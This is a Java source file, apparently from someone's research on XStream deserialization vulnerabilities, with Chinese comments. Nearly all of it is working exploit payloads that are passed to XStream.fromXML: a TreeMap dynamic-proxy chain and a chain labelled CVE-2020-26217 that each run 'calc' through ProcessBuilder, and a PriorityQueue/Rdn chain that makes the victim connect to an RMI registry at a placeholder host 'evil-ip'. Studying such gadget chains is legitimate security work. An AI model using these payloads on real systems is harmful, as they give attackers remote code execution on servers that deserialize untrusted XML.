package gadget.xstream;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;
import entity.User;
import com.thoughtworks.xstream.core.TreeUnmarshaller;
import java.beans.EventHandler;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import javax.naming.ldap.Rdn;
import com.sun.org.apache.xpath.internal.objects.XRTreeFrag;
import com.sun.org.apache.xpath.internal.objects.XRTreeFrag;
import org.springframework.util.SerializationUtils;
import sun.rmi.registry.RegistryImpl_Stub;

public class gadget1 {
    public static void main(String[] args) throws FileNotFoundException {
//        User user = new User("test",24,"sleeping");
//        XStream xStream = new XStream();
//        String unserializeResult = xStream.toXML(user);
//        System.out.println(unserializeResult);
//        User obj = (User)xStream.fromXML(unserializeResult);
//        System.out.println(obj.getAge());

//        String xmlPath = gadget1.class.getClassLoader().getResource("test.xml").getPath();
//        System.out.println(xmlPath);
//        FileInputStream fileInputStream = new FileInputStream(xmlPath);
//        XStream xStream = new XStream();
//        xStream.fromXML(fileInputStream);

//        testTreeMap();
        newerGadget2();



    }

    //和TreeSet一样
    public static void testTreeMap(){
        String evilString = "<tree-map>\n" +
                "    <entry>\n" +
                "        <dynamic-proxy>\n" +
                "            <interface>java.lang.Comparable</interface>\n" +
                "            <handler class=\"java.beans.EventHandler\">\n" +
                "                <target class=\"java.lang.ProcessBuilder\">\n" +
                "                    <command>\n" +
                "                        <string>cmd</string>\n" +
                "                        <string>/C</string>\n" +
                "                        <string>calc</string>\n" +
                "                    </command>\n" +
                "                </target>\n" +
                "                <action>start</action>\n" +
                "            </handler>\n" +
                "        </dynamic-proxy>\n" +
                "        <string>good</string>\n" +
                "    </entry>\n" +
                "</tree-map>";
        XStream xStream = new XStream();
        xStream.fromXML(evilString);
    }

    // CVE-2020-26217
    // <=1.4.13
    // gadeget:
        //XStream 处理Map类型 去调用jdk.nashorn.internal.objects.NativeString#hashCode
        //    com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString
        //    javax.activation.DataHandler#getDataSource
        //        com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream
        //            javax.crypto.CipherInputStream#read -> getMoreData
        //            javax.crypto.NullCipher#update -> chooseFirstProvider
        //                javax.imageio.spi.FilterIterator#next
        //                    javax.imageio.ImageIO.ContainsFilter#filter
        //                        ProcessBuilder#start
    public static void newerGadget1(){
        String evilString="<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "            <contentType>text/plain</contentType>\n" +
                "            <is class='java.io.SequenceInputStream'>\n" +
                "              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
                "                <iterator class='javax.imageio.spi.FilterIterator'>\n" +
                "                  <iter class='java.util.ArrayList$Itr'>\n" +
                "                    <cursor>0</cursor>\n" +
                "                    <lastRet>-1</lastRet>\n" +
                "                    <expectedModCount>1</expectedModCount>\n" +
                "                    <outer-class>\n" +
                "                      <java.lang.ProcessBuilder>\n" +
                "                        <command>\n" +
                "                          <string>calc</string>\n" +
                "                        </command>\n" +
                "                      </java.lang.ProcessBuilder>\n" +
                "                    </outer-class>\n" +
                "                  </iter>\n" +
                "                  <filter class='javax.imageio.ImageIO$ContainsFilter'>\n" +
                "                    <method>\n" +
                "                      <class>java.lang.ProcessBuilder</class>\n" +
                "                      <name>start</name>\n" +
                "                      <parameter-types/>\n" +
                "                    </method>\n" +
                "                    <name>start</name>\n" +
                "                  </filter>\n" +
                "                  <next/>\n" +
                "                </iterator>\n" +
                "                <type>KEYS</type>\n" +
                "              </e>\n" +
                "              <in class='java.io.ByteArrayInputStream'>\n" +
                "                <buf></buf>\n" +
                "                <pos>0</pos>\n" +
                "                <mark>0</mark>\n" +
                "                <count>0</count>\n" +
                "              </in>\n" +
                "            </is>\n" +
                "            <consumed>false</consumed>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";
        XStream xStream = new XStream();
        xStream.fromXML(evilString);
//        SerializationUtils
    }

    public static void  newerGadget2(){
        String evilString = "<java.util.PriorityQueue serialization='custom'>\n" +
                "    <unserializable-parents/>\n" +
                "    <java.util.PriorityQueue>\n" +
                "        <default>\n" +
                "            <size>2</size>\n" +
                "        </default>\n" +
                "        <int>3</int>\n" +
                "        <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "            <type>12345</type>\n" +
                "            <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n" +
                "                <m__obj class='string'>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content</m__obj>\n" +
                "            </value>\n" +
                "        </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "        <javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "            <type>12345</type>\n" +
                "            <value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'>\n" +
                "                <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\n" +
                "                    <parsedMessage>true</parsedMessage>\n" +
                "                    <soapVersion>SOAP_11</soapVersion>\n" +
                "                    <bodyParts/>\n" +
                "                    <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\n" +
                "                        <attachmentsInitialized>false</attachmentsInitialized>\n" +
                "                        <nullIter class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\n" +
                "                            <aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'>\n" +
                "                                <candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'>\n" +
                "                                    <names>\n" +
                "                                        <string>aa</string>\n" +
                "                                        <string>aa</string>\n" +
                "                                    </names>\n" +
                "                                    <ctx>\n" +
                "                                        <environment/>\n" +
                "                                        <registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'>\n" +
                "                                            <java.rmi.server.RemoteObject>\n" +
                "                                                <string>UnicastRef</string>\n" +
                "                                                <string>evil-ip</string>\n" +
                "                                                <int>1099</int>\n" +
                "                                                <long>0</long>\n" +
                "                                                <int>0</int>\n" +
                "                                                <long>0</long>\n" +
                "                                                <short>0</short>\n" +
                "                                                <boolean>false</boolean>\n" +
                "                                            </java.rmi.server.RemoteObject>\n" +
                "                                        </registry>\n" +
                "                                        <host>evil-ip</host>\n" +
                "                                        <port>1099</port>\n" +
                "                                    </ctx>\n" +
                "                                </candidates>\n" +
                "                            </aliases>\n" +
                "                        </nullIter>\n" +
                "                    </sm>\n" +
                "                </message>\n" +
                "            </value>\n" +
                "        </javax.naming.ldap.Rdn_-RdnEntry>\n" +
                "    </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        XStream xStream = new XStream();
        xStream.fromXML(evilString);
    }


}
